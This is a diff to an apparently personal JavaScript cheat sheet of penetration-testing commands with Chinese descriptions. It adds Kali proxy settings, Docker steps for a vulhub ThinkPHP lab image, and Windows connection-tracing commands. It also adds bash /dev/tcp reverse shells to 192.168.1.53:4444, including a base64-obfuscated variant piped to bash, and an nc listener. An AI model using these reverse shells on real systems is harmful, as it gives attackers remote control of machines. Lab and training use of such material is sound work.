@@ -217,9 +217,23 @@
       { command: 'systemctl stop NetworkManager', description: 'kali凯丽IP修改后停止网络管理服务' },
       { command: 'systemctl restart networking', description: 'kali凯丽IP修改后重启网卡' },
       { command: 'systemctl start NetworkManager', description: 'kali凯丽IP修改后启动网络管理服务' },
+      //日常命令
+      { command: 'echo "net.ipv6.conf.eth0.disable_ipv6 = 1" >> /etc/sysctl.conf || sysctl -p', description: '禁用IPv6' },
+      { command: '[ "$(id -u)" -eq 0 ] || { echo "You must be root to run the script"; exit 1; }', description: '检查是否是root用户' },   
+      
       //kali修改代理配置
       { command: 'vim /etc/proxychains4.conf', description: 'kali凯丽修改代理配置' },
-    
+      { command: 'socket 192.168.1.210 10808', description: 'kali凯丽修改代理配置' },
+      { command: 'proxychains apt update', description: 'kali凯丽修改代理配置' },
+      //docker简单使用
+      { command: 'docker save -o vulhub_thinkphp5023.tar vulhub/thinkphp', description: '将一个镜像导出保存成一个tar包-docker的使用' },    
+      { command: 'docker load -i vulhub_thinkphp5023.tar', description: '将一个镜像导出保存成一个tar包-docker的使用' },    
+      { command: 'docker run -itd -p8080:80 vulhub/thinkphp:5.0.23', description: '启动一个容器-docker的使用' },   
+      { command: 'docker stop 6de3079ffa12', description: 'docker停止一个容器-docker的使用' },   
+      { command: 'docker start 6de3079ffa12', description: 'docker删除一个容器-docker的使用' },   
+      { command: 'docker ps -a', description: '查看所有的容器-docker的使用' },   
+      
+
 
       //window10-1903渗透测试  
       { command: 'unzip external.zip -d /usr/share/metasploit-framework/', description: '利用前补充下漏洞库的文件（自行找到）-window10-1903渗透测试' },
@@ -242,11 +256,25 @@
       { command: 'set LHOST 192.168.1.53', description: '设置反弹的IP位置-payload修改' },
       { command: 'set sessions 1', description: '设置会话1-payload修改' },
       { command: 'run', description: '执行枚举-payload修改' },
+      //window10溯源
+      { command: 'netstat -ano | findstr ESTABLISHED', description: '查看自己电脑与哪些IP建立了连接-window10溯源' },
+      { command: 'tasklist | findstr 25748', description: '发现可疑IP，通过进程ID查询运行的是哪个程序-window10溯源' },      
+      { command: 'wmic process where processid=25748 get processid,executablepath,name', description: '获取程序全路径名-window10溯源' },
+      //linux 反弹与监听
+
+      { command: 'nc -nvlp 4444', description: '服务端监听命令-linux 反弹与监听' },      
+      { command: 'bash -i > /dev/tcp/192.168.1.53/4444 2>&1 0>&1', description: '未优化的反弹命令-linux 反弹与监听' },
+      { command: 'bash -i >& /dev/tcp/192.168.1.53/4444 0>&1', description: '优化后的反弹命令-linux 反弹与监听' },
+      { command: 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNTMvNDQ0NCAwPiYx | base64 -d | bash', description: 'base64转换后的反弹命令-linux 反弹与监听' },
+      
+
+
 
 
 
 
       // 其他结果..
+      //{ command: 'grep "model name" /proc/cpuinfo | cut -d ' ' -f3- | awk ''{print $1,$2,$3,$4,$5,$6,$7,$8,$9,$10}' | head -1', description: '查询主机CPU配置' },
       { command: 'vim /etc/proxychains4.conf', description: 'kali凯丽修改代理配置' }     
       
 
